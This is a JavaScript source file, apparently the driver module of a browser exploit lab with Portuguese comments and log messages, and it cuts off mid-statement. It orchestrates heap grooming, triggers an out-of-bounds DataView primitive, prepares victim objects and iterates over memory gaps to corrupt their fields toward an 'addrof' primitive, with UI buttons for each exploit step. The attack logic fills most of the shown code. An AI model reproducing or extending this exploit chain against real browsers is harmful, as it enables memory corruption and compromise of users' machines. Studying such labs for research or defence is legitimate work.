// js/app.mjs
import { log as appLog, PAUSE_LAB } from './utils.mjs';
import * as Int64Lib from './int64.mjs';
import * as Core from './core_exploit.mjs';
import * as Groomer from './heap_groomer.mjs';
import * as Corruptor from './victim_corruptor.mjs';
import * as PostExploit from './post_exploit_conceptual.mjs';
import { updateOOBConfigFromUI as updateGlobalOOBConfig} from './config.mjs';

const App = {
    runAllGroomingStrategies: async () => {
        const FNAME_STRAT = "App.runAllGroomingStrategies";
        appLog(`--- Iniciando ${FNAME_STRAT} ---`, 'test', FNAME_STRAT);
        updateGlobalOOBConfig(); // Atualiza OOB_CONFIG com valores da UI
        const spray_count_el = document.getElementById('sprayCountBase');
        const intermediate_allocs_el = document.getElementById('intermediateAllocs');

        const spray_count = spray_count_el ? parseInt(spray_count_el.value) || 500 : 500;
        const intermediate_allocs = intermediate_allocs_el ? parseInt(intermediate_allocs_el.value) || 100 : 100;

        const strategies = [
            { victim_first: true, oob_first: false, spray_adj: 0, inter_adj: 0, name: "Vítima primeiro, OOB depois (Padrão)"},
            { victim_first: false, oob_first: true, spray_adj: 0, inter_adj: 0, name: "OOB primeiro, Vítima depois"},
            { victim_first: true, oob_first: false, spray_adj: 200, inter_adj: 50, name: "Vítima primeiro, Spray Maior"},
            { victim_first: false, oob_first: true, spray_adj: -100, inter_adj: -20, name: "OOB primeiro, Spray Menor"},
        ];
        Corruptor.resetLastSuccessfulGap();

        for (const strat of strategies) {
            if (Corruptor.getLastSuccessfulGap() !== null) {
                appLog("GAP de sucesso já encontrado. Interrompendo estratégias adicionais.", "good", FNAME_STRAT);
                break;
            }
            appLog(`*** Iniciando Estratégia de Grooming: ${strat.name} ***`, "critical", FNAME_STRAT);

            let victimPrepared = false;
            let currentOOBAllocationSize = Core.getOOBAllocationSize(); // Pega o tamanho da config global (já atualizada)
            appLog(`   Estratégia '${strat.name}' usando OOB_ALLOCATION_SIZE: ${currentOOBAllocationSize}`, "info", FNAME_STRAT);


            if (strat.oob_first) {
                appLog(`   Estratégia '${strat.name}': OOB será ativado primeiro.`, "info", FNAME_STRAT);
                await Core.triggerOOB_primitive();
                if (!Core.oob_dataview_real) { appLog("Falha ao ativar OOB (OOB primeiro), pulando estratégia.", "error", FNAME_STRAT); continue; }

                await Groomer.groomHeapForSameSize(spray_count + strat.spray_adj, currentOOBAllocationSize, intermediate_allocs + strat.inter_adj, false);
                victimPrepared = await Groomer.prepareVictim(currentOOBAllocationSize);
            } else {
                appLog(`   Estratégia '${strat.name}': Vítima será preparada primeiro.`, "info", FNAME_STRAT);
                await Groomer.groomHeapForSameSize(spray_count + strat.spray_adj, currentOOBAllocationSize, intermediate_allocs + strat.inter_adj, true);
                victimPrepared = await Groomer.prepareVictim(currentOOBAllocationSize);

                if (victimPrepared) {
                    appLog(`   Estratégia '${strat.name}': Vítima preparada, ativando OOB agora.`, "info", FNAME_STRAT);
                    await Core.triggerOOB_primitive();
                    if (!Core.oob_dataview_real) { appLog("Falha ao ativar OOB (após vítima), pulando estratégia.", "error", FNAME_STRAT); continue; }
                }
            }

            // Logs de diagnóstico cruciais
            appLog(`   Estratégia '${strat.name}': Status Pós-Preparação -> victimPrepared: ${victimPrepared}, Groomer.victim_object existe: ${!!Groomer.victim_object}`, "info", FNAME_STRAT);
            if (Groomer.victim_object) {
                appLog(`      Groomer.victim_object.length: ${Groomer.victim_object.length}`, "info", FNAME_STRAT);
            }


            if (!victimPrepared) {
                appLog(`   Estratégia '${strat.name}': Falha ao preparar vítima (victimPrepared é false). Pulando corrupção.`, "error", FNAME_STRAT);
                await PAUSE_LAB(500); // Pequena pausa antes da próxima estratégia
                continue;
            }

            if (!Groomer.victim_object) {
                 appLog(`   Estratégia '${strat.name}': ERRO CRÍTICO FINAL CHECK: Groomer.victim_object é null ANTES de chamar findAndCorrupt. Pulando corrupção.`, "error", FNAME_STRAT);
                 await PAUSE_LAB(500); // Pequena pausa
                 continue;
            }

            if (!Core.oob_dataview_real) { // Checagem adicional, especialmente se OOB é ativado depois da vítima
                appLog(`   Estratégia '${strat.name}': ERRO CRÍTICO: Primitiva OOB não está ativa ANTES de chamar findAndCorrupt. Pulando corrupção.`, "error", FNAME_STRAT);
                await PAUSE_LAB(500);
                continue;
            }

            appLog(`   Estratégia '${strat.name}': Vítima OK, OOB OK. Tentando corrupção...`, "info", FNAME_STRAT);
            await Corruptor.findAndCorruptVictimFields_Iterative();
            await PAUSE_LAB(2000); // Pausa entre estratégias
        }
        appLog(`--- ${FNAME_STRAT} Concluído ---`, 'test', FNAME_STRAT);
        if (Corruptor.getLastSuccessfulGap() === null) { appLog("Nenhuma estratégia resultou em GAP de sucesso.", "error", FNAME_STRAT); }
         else {
            const addrofGapEl = document.getElementById('addrofGap');
            if (addrofGapEl) addrofGapEl.value = Corruptor.getLastSuccessfulGap();
         }
    },

    updateCurrentTestGapFromScanUIAndTestSingle: () => {
        const gapStartScanEl = document.getElementById('gapStartScan');
        const gapVal = gapStartScanEl ? parseInt(gapStartScanEl.value) : NaN;

        if (!isNaN(gapVal)) {
            Corruptor.setCurrentTestGap(gapVal);
            appLog(`CURRENT_TEST_GAP (teste único) atualizado para: ${Corruptor.getCurrentTestGap()} bytes.`, 'tool', 'App.Config');
            if (!Groomer.victim_object || !Core.oob_dataview_real) {
                appLog("ERRO: Vítima ou primitiva OOB não estão prontas para teste de GAP único. Execute os Passos 0 e 1 (ou uma estratégia de grooming).", "error", "App.Config");
                return;
            }
            Corruptor.try_corrupt_fields_for_gap(Corruptor.getCurrentTestGap());
        } else { appLog("Valor de GAP inválido.", "error", "App.Config"); }
    },

    setupUIEventListeners: () => {
        const moduleTestButtonsContainer = document.getElementById('moduleTestButtons');
        if (moduleTestButtonsContainer) {
            moduleTestButtonsContainer.innerHTML = '';
            const btnTestInt64 = document.createElement('button');
            btnTestInt64.textContent = 'Testar Módulo Int64';
            btnTestInt64.onclick = () => Int64Lib.testModule(appLog); // Passa appLog
            moduleTestButtonsContainer.appendChild(btnTestInt64);

            const btnTestUtils = document.createElement('button');
            btnTestUtils.textContent = 'Testar Módulo Utils';
            // utils.testModule usa 'log' global que é o appLog de utils.mjs
            btnTestUtils.onclick = () => import('./utils.mjs').then(utils => utils.testModule());
            moduleTestButtonsContainer.appendChild(btnTestUtils);

            const btnTestCore = document.createElement('button');
            btnTestCore.textContent = 'Testar Módulo CoreExploit (OOB)';
            btnTestCore.onclick = Core.testModule;
            moduleTestButtonsContainer.appendChild(btnTestCore);

            const notes = document.createElement('p');
            notes.className = 'notes';
            notes.textContent = 'Módulos HeapGroomer e VictimCorruptor são testados através dos fluxos principais. PostExploit é conceitual.';
            moduleTestButtonsContainer.appendChild(notes);
        }

        document.getElementById('btnTriggerOOB')?.addEventListener('click', Core.triggerOOB_primitive);
        document.getElementById('btnRunGroomingStrategies')?.addEventListener('click', App.runAllGroomingStrategies);
        document.getElementById('btnTestSingleGap')?.addEventListener('click', App.updateCurrentTestGapFromScanUIAndTestSingle);
        document.getElementById('btnFindAndCorruptIterative')?.addEventListener('click', Corruptor.findAndCorruptVictimFields_Iterative);
        document.getElementById('btnTestKnownGap')?.addEventListener('click', Corruptor.
